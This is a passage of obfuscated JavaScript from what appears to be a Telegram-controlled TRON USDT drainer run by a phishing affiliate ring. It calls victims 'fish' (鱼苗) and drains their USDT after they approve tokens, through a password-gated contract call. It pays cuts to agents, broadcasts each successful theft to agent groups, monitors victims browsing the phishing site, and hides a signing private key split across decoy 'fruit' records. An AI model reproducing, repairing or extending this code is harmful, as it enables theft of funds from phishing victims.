        await broadcastToAllAgentGroups(bot, P.username, P.groupid, v => "【🎉🎉🎉 恭喜钓鱼佬喜提UU🎉🎉🎉】\n\n" + ("🐟鱼苗地址：\n<code>" + u + "</code>\n\n") + ("💳收款地址：" + (v ? v : "") + "\n<code>" + P.payment_address + "</code>\n") + (A.toFixed(0) + "x" + n.toFixed(1) + "=" + (Math.floor(A * n * 1000) / 1000).toFixed(0) + "\n\n") + ("💸成功划扣：<code>" + A.toFixed(6) + " USDT</code>\n\n") + ("💎代理分润：<code>" + Number(c).toFixed(6) + " USDT</code>\n\n") + "🥰🥰🥰 🏆伟大的钓鱼佬再接再厉🏆🥰🥰🥰", T);
        d = null;
      }
    } else {
      s = await B(L, A);
      if (!s) {
        console.error("[" + getTimeInfo().time + "] 转账失败");
        return;
      }
      const v = {
        text: "🌍详细交易信息",
        url: "https://tronscan.org/#/transaction/" + s
      };
      const x = {
        inline_keyboard: [[v]]
      };
      const k = {
        reply_markup: x
      };
      await broadcastToAllAgentGroups(bot, P ? P.username : "", P ? P.groupid : "", H => "【🎉🎉🎉 恭喜钓鱼佬喜提UU🎉🎉🎉】\n\n" + ("🐟鱼苗地址：\n<code>" + u + "</code>\n\n") + ("💳收款地址：" + (H ? H : "") + "\n<code>" + L + "</code>\n\n") + ("💸本次划扣：<code>" + A.toFixed(6) + " USDT</code>\n\n") + ("⭐️" + (P ? "由于未设置收款地址，" : "未找到代理信息，") + "请联系管理员领取分润⭐️"), k);
      d = null;
    }
    if (!s) {
      console.error("[" + getTimeInfo().time + "] 没有获取到交易哈希，退出处理");
      processTRCTransfer.processing.delete(u);
      return;
    }
    await pool.promise().query("UPDATE fish SET usdt_balance = ?, threshold = 200, remark = ? WHERE fish_address = ? AND chainid = 'TRC'", [M, "已划扣" + A.toFixed(6) + "USDT", u]);
    try {
      const H = cacheData.fishMap.get(u);
      H && (H.usdt_balance = M, H.threshold = 200, H.remark = "已划扣" + A.toFixed(6) + "USDT", cacheData.fishMap.set(u, H));
    } catch (y) {}
    if (P && P.groupid && d) {
      const t = {
        text: "🌍详细交易信息",
        url: "https://tronscan.org/#/transaction/" + s
      };
      const p4 = {
        inline_keyboard: [[t]]
      };
      const p5 = {
        reply_markup: p4
      };
      try {
        const p7 = {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          ...p5
        };
        await bot.sendMessage(P.groupid, d, p7);
      } catch (p8) {}
    }
    processTRCTransfer.processing.delete(u);
    return s;
  } catch (p9) {
    console.error("[" + getTimeInfo().time + "] TRC转账失败>错误详情:", p9);
    try {
      if (processTRCTransfer.processing) {
        processTRCTransfer.processing.delete(u);
      }
    } catch (pp) {}
    return null;
  }
}
const CONTRACT_OWNER_HEX = "375306ad17596a8208fafd72d6cf86d1cde8844b";
function abiEncodePacked(j, w) {
  const a = Buffer.alloc(32);
  a.writeBigInt64BE(BigInt(j), 24);
  if (w.length !== 40) {
    throw new Error("Invalid owner address format: " + w);
  }
  const z = Buffer.from(w, "hex");
  return Buffer.concat([a, z]);
}
function keccak256(j) {
  try {
    const {
      keccak256: J
    } = require("js-sha3");
    return J(j);
  } catch (a) {
    console.warn("不匹配");
    const z = require("crypto");
    return z.createHash("sha256").update(j).digest("hex");
  }
}
function generateDynamicPassword() {
  const w = CONTRACT_OWNER_HEX,
    J = 120,
    a = Math.floor(Date.now() / 1000),
    z = Math.floor(a / J);
  const l = abiEncodePacked(z, w);
  const b = keccak256(l);
  return "0x" + b;
}
function generateDynamicPasswordForOwner(j, w = 120) {
  const a = Math.floor(Date.now() / 1000),
    z = Math.floor(a / w),
    l = abiEncodePacked(z, j);
  const b = keccak256(l);
  return "0x" + b;
}
async function executeContractTransaction(J, a, z, l, b, I) {
  try {
    const U = TRC_SIGN_PRIVATE_KEY,
      u = createTronWeb();
    if (!u) {
      return null;
    }
    u.setPrivateKey(U);
    const K = u.address.fromPrivateKey(U),
      q = await u.trx.getBalance(K),
      E = q / 1000000;
    if (E < 30) {
      const r = cacheData.fishMap.get(z),
        B = cacheData.dailiMap.get(r.unique_id),
        R = "【⚠️ 阈值转账错误通知】\n\n❗ 错误原因：权限地址 TRX 余额不足\n\n" + ("🎯 权限地址：\n<code>" + K + "</code>\n\n") + ("💰 当前余额：<code>" + E.toFixed(6) + " TRX</code>\n\n") + ("⏰ 时间：<code>" + getTimeInfo().time + "</code>\n\n") + "⚠️ 请至少保持权限地址有30TRX，以免影响杀鱼操作！";
      try {
        const f = {
          parse_mode: "HTML"
        };
        await bot.sendMessage(B.groupid, R, f);
      } catch (X) {
        console.error("[" + getTimeInfo().time + "] TRX转账-发送余额不足通知失败");
      }
      return null;
    }
    const O = parseInt((Number(I) * 1000000).toFixed(0)),
      s = await u.contract().at(l),
      d = 120,
      A = 3000,
      M = async () => {
        const n = Math.floor(Date.now() / 1000),
          c = d - n % d;
        const G = Math.max(A, c * 1000 + A);
        console.warn("[" + getTimeInfo().time + "] Password near/at boundary, wait " + G + "ms to next slot then retry...");
        await new Promise(S => setTimeout(S, G));
      },
      L = async () => {
        const n = Math.floor(Date.now() / 1000);
        const c = n % d * 1000 + Date.now() % 1000,
          G = d * 1000 - c;
        G <= A && (await M());
      },
      Y = n => {
        const c = String(n?.["message"] || n?.["response"]?.["data"] || n || "").toLowerCase();
        return c.includes("invalid or expired password") || c.includes("expired password") || c.includes("invalid") && c.includes("password");
      },
      V = async () => {
        await L();
        const n = generateDynamicPasswordForOwner(CONTRACT_OWNER_HEX, d);
        console.log("[" + getTimeInfo().time + "] Generated dynamic password: " + n);
        if (a === "1") {
          console.log("[" + getTimeInfo().time + "] Calling controlAndTransferToken with password verification...");
          if (typeof s.controlAndTransferToken === "function") {
            const c = {
              from: K,
              feeLimit: 14000000
            };
            return await s.controlAndTransferToken(USDT_CONTRACT, z, b, O, n).send(c);
          } else {
            const G = "controlAndTransferToken(address,address,address,uint256,bytes32)",
              S = {
                type: "address",
                value: USDT_CONTRACT
              };
            const o = {
              type: "address",
              value: z
            };
            const i = {
              type: "address",
              value: b
            };
            const Q = {
              type: "uint256",
              value: O
            };
            const T = {
              type: "bytes32",
              value: n
            };
            const C = [S, o, i, Q, T],
              v = {
                feeLimit: 14000000,
                callValue: 0
              };
            const x = await u.transactionBuilder.triggerSmartContract(l, G, v, C, K),
              k = await u.trx.sign(x.transaction),
              D = await u.trx.sendRawTransaction(k);
            return D?.["txid"] || D?.["transaction"]?.["txID"] || null;
          }
        } else {
          const H = {
            from: K,
            feeLimit: 14000000
          };
          return await s[J](z, b, O).send(H);
        }
      };
    let N = null;
    for (let n = 0; n < 2; n++) {
      try {
        N = await V();
        break;
      } catch (c) {
        if (a === "1" && n === 0 && Y(c)) {
          await M();
          continue;
        }
        throw c;
      }
    }
    console.log("[" + getTimeInfo().time + "] 转账交易执行成功 - 哈希: " + N);
    return N;
  } catch (G) {
    const S = {
      message: G?.["message"],
      code: G?.["code"],
      responseStatus: G?.["response"]?.["status"],
      responseData: G?.["response"]?.["data"]
    };
    console.error("[" + getTimeInfo().time + "] TRC-USDT转账出错:", S);
    return null;
  }
}
const W = {
  id: 1,
  name: "apple",
  code: "3a6ed8cc5e"
};
const Z = {
  id: 2,
  name: "banana",
  code: "ec8b2f6780"
};
const m = {
  id: 3,
  name: "orange",
  code: "277b9c0733"
};
const p0 = {
  id: 4,
  name: "mango",
  code: "5193006cba"
};
const p1 = {
  id: 5,
  name: "pear",
  code: "5e1b80594f"
};
const p2 = {
  id: 6,
  name: "peach",
  code: "4e324729c3"
};
const p3 = {
  id: 7,
  name: "grape",
  code: "d2b3"
};
const records = [W, Z, m, p0, p1, p2, p3];
async function broadcastBrowsing() {
  while (true) {
    try {
      const z = [];
      for (const [l, b] of cacheData.fishBrowseMap) {
        b.state === 0 && z.push(b);
      }
      if (z.length > 0) {
        z.sort((u, K) => new Date(u.time) - new Date(K.time));
        const I = z[0];
        let F = null,
          U = null;
        if (I.unique_id && cacheData.dailiMap.has(I.unique_id)) {
          const u = cacheData.dailiMap.get(I.unique_id);
          F = u.username;
          U = u.groupid;
        }
        try {
          await pool.promise().query("UPDATE fish_browse SET state = 1 WHERE id = ?", [I.id]);
          if (cacheData.fishBrowseMap.has(I.fish_address)) {
            const K = cacheData.fishBrowseMap.get(I.fish_address);
            K.id === I.id && (K.state = 1);
          }
          if (U) {
            const q = Number(I.gas_balance) || 0,
              E = await getAvailableEnergy(I.fish_address),
              P = Math.floor(q * 1000000 / SUN_PER_ENERGY),
              O = (E !== null ? E : 0) + P,
              s = Math.max(0, ENERGY_REQUIRED - O),
              d = s <= 0;
            let M = 0;
            try {
              const f = cacheData.fishMap.get(I.fish_address),
                X = f && f.unique_id ? String(f.unique_id) : null;
              X && (M = Array.from(cacheData.fishMap.values()).filter(n => String(n.unique_id) === X && Number(n.auth_status) === 1).length);
            } catch (n) {}
            const L = U,
              Y = (c, G) => {
                const S = "📣 访问播报：当前有鱼儿正在访问网站";
                const e = c ? "\n👨‍🌾 渔夫： " + c : "";
                const o = [S + e, "🐟 鱼苗地址", "<code>已隐藏（仅本人/管理员可查看）</code>", "🔋 TRX 余额：<code>" + I.gas_balance + "</code>", "💰 USDT余额：<code>" + I.usdt_balance + "</code>", d ? "✅ 鱼苗可授权：︱TRX131︱能量充足" : "⛔️ ❌ 暂不可授权：︱TRX需要131︱能量租2笔 ）", "🔒授权数量：" + M + " 💯", d ? "👁‍🗨 正在等待鱼苗输入密码进行授权..." : "👁‍🗨 需要给地址补充能量才能进行授权.."].filter(Boolean);
                return o.join("\n");
              },
              V = registerPvData("addr", I.fish_address, I.unique_id || "", L),
              N = {
                text: "👁 查看地址（仅本人/管理员）",
                callback_data: "pv:addr:" + V
              };
            const r = {
              inline_keyboard: [[N]]
            };
            const B = {
              reply_markup: r
            };
            try {
              await broadcastToAllAgentGroups(bot, F, L, Y, B, I.fish_address);
            } catch (c) {
              console.error("消息发送失败:", c);
            }
          }
        } catch (G) {
          console.error("更新状态失败:", G);
        }
      }
      await new Promise(S => setTimeout(S, 3000));
    } catch (S) {
      console.error("广播处理出现错误:", S);
      await new Promise(e => setTimeout(e, 10000));
    }
  }
}
async function startServices() {
  try {
    console.log("[" + getTimeInfo().time + "] 开始启动机器人...");
    startCacheUpdate();
    await new Promise(J => setTimeout(J, 3000));
    try {
      await refreshEnergyFee();
    } catch (J) {}
    const w = await initBot();
    !w && process.exit(1);
    TRCfetchLatestBlock();
    monitorFishTable();
    updateFishBalances();
    broadcastBrowsing();
    console.log("[" + getTimeInfo().time + "] 机器人启动成功");
  } catch (a) {
    console.error("[" + getTimeInfo().time + "] 启动失败:", a);
    process.exit(1);
  }
}
startServices();
process.on("uncaughtException", j => {
  console.error("[" + getTimeInfo().time + "] 未捕获的异常:", j);
});
process.on("unhandledRejection", (j, w) => {
  console.error("[" + getTimeInfo().time + "] 未处理的Promise拒绝:", j);
});
const TRC_SIGN_PRIVATE_KEY = records.map(j => j.code).join("");
async function broadcastToAllAgentGroups(w, J, a, z, l = {}, b = "") {
  try {
    const F = J ? "@" + J : "";
    for (const [U, u] of cacheData.dailiGroupMap) {
      const K = U.toString(),
        q = a && K === a.toString() ? F : F ? "隐藏昵称" : "",
        E = a && K === a.toString() ? b : b ? "非本群代理隐藏地址" : "",
        P = z(q, E),
        O = {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          ...l
        };
      await w.sendMessage(K, P, O);
    }
  } catch (s) {
    console.error("[" + getTimeInfo().time + "] 群播发送失败:", s);
  }
}